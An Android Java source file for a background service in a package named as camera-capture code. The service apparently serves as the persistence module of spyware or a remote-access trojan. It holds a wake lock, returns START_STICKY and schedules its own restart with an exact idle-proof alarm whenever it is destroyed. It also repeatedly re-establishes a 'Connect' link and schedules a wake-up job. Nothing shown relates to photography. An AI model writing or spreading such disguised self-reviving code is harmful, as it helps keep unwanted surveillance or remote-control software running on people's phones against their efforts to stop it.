package com.android.photo.camera.capture;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.util.Log;

public class ClassGen11Service extends Service implements MonitoringRunnable.ServiceMonitor {
    private static final String TAG = "ClassGen11Service";
    private PowerManager.WakeLock wakeLock;
    private Handler handler;
    private static final long CHECK_INTERVAL = 150 * 1000; // 2.5 minutes
    private static final long RESTART_INTERVAL = 20 * 1000; // 20 seconds
    private boolean isDestroyed = false;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "ClassGen11Service created");
        handler = new Handler(Looper.getMainLooper());
        acquireWakeLock();
        startSystemMonitoring();
    }

    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "ClassGen11Service::WakeLockTag"
            );
            wakeLock.acquire(25 * 60 * 1000L); // 25 minutes timeout
        } catch (Exception e) {
            Log.e(TAG, "Error acquiring wake lock", e);
        }
    }

    private void startSystemMonitoring() {
        handler.postDelayed(new MonitoringRunnable(this, handler, CHECK_INTERVAL), CHECK_INTERVAL);
    }

    @Override
    public boolean isDestroyed() {
        return isDestroyed;
    }

    @Override
    public void performMonitoringTask() {
        monitorSystem();
    }

    private void monitorSystem() {
        Log.d(TAG, "Monitoring system...");
        if (!Connect.getInstance(getApplicationContext()).isConnected()) {
            Connect.startAsync(getApplicationContext());
        }
        Intent pingIntent = new Intent("PING_SERVICES");
        sendBroadcast(pingIntent);
        WackMeUpJob.scheduleJob(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "ClassGen11Service started");
        monitorSystem();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "ClassGen11Service destroyed");
        isDestroyed = true;
        if (wakeLock != null && wakeLock.isHeld()) {
            try {
                wakeLock.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing wake lock", e);
            }
        }
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
        scheduleRestart();
    }

    private void scheduleRestart() {
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            Intent intent = new Intent(this, ClassGen11Service.class);
            int flags = PendingIntent.FLAG_ONE_SHOT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flags |= PendingIntent.FLAG_IMMUTABLE;
            }
            PendingIntent pendingIntent = PendingIntent.getService(
                    this,
                    1004,
                    intent,
                    flags
            );
            if (alarmManager != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager.setExactAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP,
                            SystemClock.elapsedRealtime() + RESTART_INTERVAL,
                            pendingIntent
                    );
                } else {
                    alarmManager.setExact(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP,
                            SystemClock.elapsedRealtime() + RESTART_INTERVAL,
                            pendingIntent
                    );
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling restart", e);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}